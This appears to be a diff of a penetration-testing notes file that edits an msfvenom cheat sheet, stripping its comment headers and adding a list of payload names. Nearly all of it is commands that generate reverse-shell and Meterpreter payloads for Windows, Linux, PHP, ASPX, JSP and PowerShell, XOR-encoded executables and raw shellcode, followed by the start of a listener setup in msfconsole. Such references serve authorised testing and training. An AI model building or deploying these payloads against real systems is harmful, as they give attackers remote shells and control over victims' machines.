@@ -138,96 +138,38 @@ exit                               -> Çıxış
 MSFVENOM CHEAT SHEET
 ==============================
 
-# Payload siyahısı
 msfvenom -l payloads
-
-# Encoder siyahısı
 msfvenom -l encoders
-
-# Format siyahısı
 msfvenom -l formats
 
-# ----------------------------
-# WINDOWS
-# ----------------------------
-
-# Windows reverse shell (EXE)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
-
-# Windows Meterpreter (EXE)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o meter.exe
-
-# Windows stageless Meterpreter
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f exe -o meter.exe
-
-# Windows DLL payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll -o payload.dll
-
-# ----------------------------
-# LINUX
-# ----------------------------
-
-# Linux reverse shell
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf
-
-# Linux Meterpreter
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o meter.elf
-
-# ----------------------------
-# WEB PAYLOADS
-# ----------------------------
-
-# PHP reverse shell
 msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw -o shell.php
-
-# ASPX Meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx -o shell.aspx
-
-# JSP reverse shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.jsp
-
-# ----------------------------
-# POWERSHELL
-# ----------------------------
-
-# PowerShell payload (script)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f ps1 -o shell.ps1
-
-# PowerShell one-liner
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f psh
-
-# ----------------------------
-# ENCODING
-# ----------------------------
-
-# Single encode
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/xor -f exe -o enc.exe
-
-# Multiple encode
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/xor -i 5 -f exe -o enc.exe
-
-# ----------------------------
-# SHELLCODE
-# ----------------------------
-
-# C shellcode
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f c
-
-# Python shellcode
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f python
-
-# ----------------------------
-# BAD CHARS
-# ----------------------------
-
-# Exclude bad characters
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -b '\x00\x0a\x0d' -f exe -o clean.exe
 
-# ----------------------------
-# HANDLER (MSFCONSOLE)
-# ----------------------------
+windows/x64/shell_reverse_tcp
+windows/x64/meterpreter/reverse_tcp
+windows/x64/meterpreter_reverse_tcp (stageless)
+linux/x64/shell_reverse_tcp
+linux/x64/meterpreter/reverse_tcp
+php/reverse_php
+java/jsp_shell_reverse_tcp
+windows/meterpreter/reverse_tcp (x86 legacy)
+cmd/unix/reverse_bash
+windows/x64/shell_bind_tcp
 
-msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST IP
